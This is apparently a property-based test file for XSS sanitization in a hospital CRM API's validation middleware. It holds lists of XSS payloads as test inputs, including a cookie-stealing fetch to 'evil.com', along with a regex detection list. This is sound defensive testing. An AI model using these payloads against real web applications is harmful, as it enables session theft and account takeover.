/**
 * Property-Based Tests for XSS Prevention
 * 
 * Tests that the validation module sanitizes inputs to prevent XSS attacks.
 * Uses fast-check for property-based testing.
 * 
 * Feature: hospital-crm-api, Property 26: XSS Prevention
 */

const fc = require('fast-check');
const { validationResult } = require('express-validator');
const {
  validatePatient,
  validateAppointment,
  validateDoctor,
  validatePayment,
  validateLead
} = require('../../middleware/validation');

/**
 * Helper function to run validation rules and extract sanitized values
 * @param {Array} validationRules - Array of express-validator rules
 * @param {Object} data - Data to validate
 * @returns {Promise<Object>} Validation result with sanitized data
 */
async function runValidationAndGetSanitized(validationRules, data) {
  const req = {
    body: data
  };
  
  // Run all validation rules
  for (const validation of validationRules) {
    await validation.run(req);
  }
  
  const errors = validationResult(req);
  return {
    isValid: errors.isEmpty(),
    errors: errors.array(),
    sanitizedBody: req.body
  };
}

/**
 * Check if a string contains potentially dangerous XSS patterns
 * @param {string} str - String to check
 * @returns {boolean} True if string contains XSS patterns
 */
function containsXSSPatterns(str) {
  if (typeof str !== 'string') return false;
  
  const xssPatterns = [
    /<script/i,
    /<\/script>/i,
    /javascript:/i,
    /onerror=/i,
    /onload=/i,
    /onclick=/i,
    /<iframe/i,
    /<embed/i,
    /<object/i,
    /eval\(/i,
    /expression\(/i
  ];
  
  return xssPatterns.some(pattern => pattern.test(str));
}

describe('XSS Prevention Property Tests', () => {
  
  /**
   * Property 26: XSS Prevention
   * For any string input containing HTML or script tags,
   * the validation module should sanitize it to prevent XSS attacks.
   * 
   * Validates: Requirements 11.3
   */
  describe('Property 26: XSS Prevention', () => {
    
    test('should sanitize script tags in patient data', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant('<script>alert("XSS")</script>'),
            fc.constant('<script src="evil.js"></script>'),
            fc.constant('"><script>alert(1)</script>'),
            fc.constant('<img src=x onerror=alert(1)>'),
            fc.constant('<svg onload=alert(1)>'),
            fc.constant('javascript:alert(1)'),
            fc.constant('<iframe src="evil.com"></iframe>'),
            fc.constant('<body onload=alert(1)>'),
            fc.constant('<input onfocus=alert(1) autofocus>'),
            fc.constant('<select onfocus=alert(1) autofocus>')
          ),
          async (xssPayload) => {
            const data = {
              firstName: 'John',
              lastName: 'Doe',
              dateOfBirth: '1990-01-01',
              gender: 'male',
              bloodGroup: 'A+',
              phone: '1234567890',
              address: xssPayload,
              medicalHistory: xssPayload,
              allergies: xssPayload
            };
            
            const result = await runValidationAndGetSanitized(validatePatient, data);
            
            // Check that dangerous patterns are sanitized
            const addressSanitized = !containsXSSPatterns(result.sanitizedBody.address || '');
            const medicalHistorySanitized = !containsXSSPatterns(result.sanitizedBody.medicalHistory || '');
            const allergiesSanitized = !containsXSSPatterns(result.sanitizedBody.allergies || '');
            
            return addressSanitized && medicalHistorySanitized && allergiesSanitized;
          }
        ),
        { numRuns: 100 }
      );
    });
    
    test('should sanitize HTML tags in appointment notes', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant('<b>Bold text</b>'),
            fc.constant('<div>Content</div>'),
            fc.constant('<p onclick="alert(1)">Click me</p>'),
            fc.constant('<a href="javascript:alert(1)">Link</a>'),
            fc.constant('<img src=x onerror=alert(1)>'),
            fc.constant('<style>body{background:red}</style>')
          ),
          async (htmlPayload) => {
            const data = {
              patientId: 1,
              doctorId: 1,
              appointmentDate: '2024-01-01',
              appointmentTime: '10:00:00',
              appointmentType: 'consultation',
              reason: htmlPayload,
              notes: htmlPayload
            };
            
            const result = await runValidationAndGetSanitized(validateAppointment, data);
            
            // Check that HTML/script patterns are sanitized
            const reasonSanitized = !containsXSSPatterns(result.sanitizedBody.reason || '');
            const notesSanitized = !containsXSSPatterns(result.sanitizedBody.notes || '');
            
            return reasonSanitized && notesSanitized;
          }
        ),
        { numRuns: 100 }
      );
    });
    
    test('should sanitize XSS in doctor bio', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant('<script>steal_credentials()</script>'),
            fc.constant('Dr. Smith<img src=x onerror=alert(1)>'),
            fc.constant('Specialist in <iframe src="evil.com"></iframe>'),
            fc.constant('<object data="evil.swf"></object>'),
            fc.constant('<embed src="evil.swf">')
          ),
          async (xssPayload) => {
            const data = {
              userId: 1,
              specialization: 'Cardiology',
              qualification: 'MBBS, MD',
              licenseNumber: 'LIC123456',
              bio: xssPayload
            };
            
            const result = await runValidationAndGetSanitized(validateDoctor, data);
            
            // Check that bio is sanitized
            return !containsXSSPatterns(result.sanitizedBody.bio || '');
          }
        ),
        { numRuns: 100 }
      );
    });
    
    test('should sanitize XSS in payment description', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant('Payment for <script>alert(1)</script>'),
            fc.constant('<img src=x onerror=fetch("evil.com?cookie="+document.cookie)>'),
            fc.constant('Invoice <svg onload=alert(1)>'),
            fc.constant('<input type="text" onfocus=alert(1) autofocus>')
          ),
          async (xssPayload) => {
            const data = {
              patientId: 1,
              amount: 100.00,
              paymentMethod: 'cash',
              description: xssPayload,
              notes: xssPayload
            };
            
            const result = await runValidationAndGetSanitized(validatePayment, data);
            
            // Check that description and notes are sanitized
            const descriptionSanitized = !containsXSSPatterns(result.sanitizedBody.description || '');
            const notesSanitized = !containsXSSPatterns(result.sanitizedBody.notes || '');
            
            return descriptionSanitized && notesSanitized;
          }
        ),
        { numRuns: 100 }
      );
    });
    
    test('should sanitize XSS in lead notes', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.oneof(
            fc.constant('Interested in <script>alert(document.cookie)</script>'),
            fc.constant('<img src=x onerror=alert(1)>'),
            fc.constant('Follow up <iframe src="evil.com"></iframe>'),
            fc.constant('<body onload=alert(1)>')
          ),
          async (xssPayload) => {
            const data = {
              firstName: 'John',
              phone: '1234567890',
              source: 'website',
              notes: xssPayload,
              interestedIn: xssPayload
            };
            
            const result = await runValidationAndGetSanitized(validateLead, data);
            
            // Check that notes and interestedIn are sanitized
            const notesSanitized = !containsXSSPatterns(result.sanitizedBody.notes || '');
            const interestedInSanitized = !containsXSSPatterns(result.sanitizedBody.interestedIn || '');
            
            return notesSanitized && interestedInSanitized;
          }
        ),
        { numRuns: 100 }
      );
    });
    
    test('should handle mixed content with XSS attempts', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.record({
            normalText: fc.string({ minLength: 5, maxLength: 20 }),
            xssAttempt: fc.constantFrom(
              '<script>alert(1)</script>',
              '<img src=x onerror=alert(1)>',
              'javascript:alert(1)',
              '<iframe src="evil.com"></iframe>'
            )
          }),
          async ({ normalText, xssAttempt }) => {
            const mixedContent = `${normalText} ${xssAttempt} ${normalText}`;
            
            const data = {
              firstName: 'John',
              lastName: 'Doe',
              dateOfBirth: '1990-01-01',
              gender: 'male',
              bloodGroup: 'A+',
              phone: '1234567890',
              address: mixedContent
            };
            
            const result = await runValidationAndGetSanitized(validatePatient, data);
            
            // The sanitized address should not contain XSS patterns
            return !containsXSSPatterns(result.sanitizedBody.address || '');
          }
        ),
        { numRuns: 100 }
      );
    });
    
    test('should preserve safe content while removing XSS', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.string({ minLength: 5, maxLength: 50 }).filter(s => !containsXSSPatterns(s)),
          async (safeContent) => {
            const data = {
              firstName: 'John',
              lastName: 'Doe',
              dateOfBirth: '1990-01-01',
              gender: 'male',
              bloodGroup: 'A+',
              phone: '1234567890',
              address: safeContent
            };
            
            const result = await runValidationAndGetSanitized(validatePatient, data);
            
            // Safe content should remain (though may be escaped)
            // The key is that it should not be empty if input was not empty
            return result.sanitizedBody.address !== undefined;
          }
        ),
        { numRuns: 100 }
      );
    });
    
    test('should sanitize event handlers in all string fields', async () => {
      const eventHandlers = [
        'onerror=',
        'onload=',
        'onclick=',
        'onmouseover=',
        'onfocus=',
        'onblur=',
        'onchange=',
        'onsubmit='
      ];
      
      await fc.assert(
        fc.asyncProperty(
          fc.constantFrom(...eventHandlers),
          async (eventHandler) => {
            const xssPayload = `<img src=x ${eventHandler}alert(1)>`;
            
            const data = {
              firstName: 'John',
              lastName: 'Doe',
              dateOfBirth: '1990-01-01',
              gender: 'male',
              bloodGroup: 'A+',
              phone: '1234567890',
              medicalHistory: xssPayload
            };
            
            const result = await runValidationAndGetSanitized(validatePatient, data);
            
            // Event handlers should be sanitized
            return !containsXSSPatterns(result.sanitizedBody.medicalHistory || '');
          }
        ),
        { numRuns: 100 }
      );
    });
  });
});
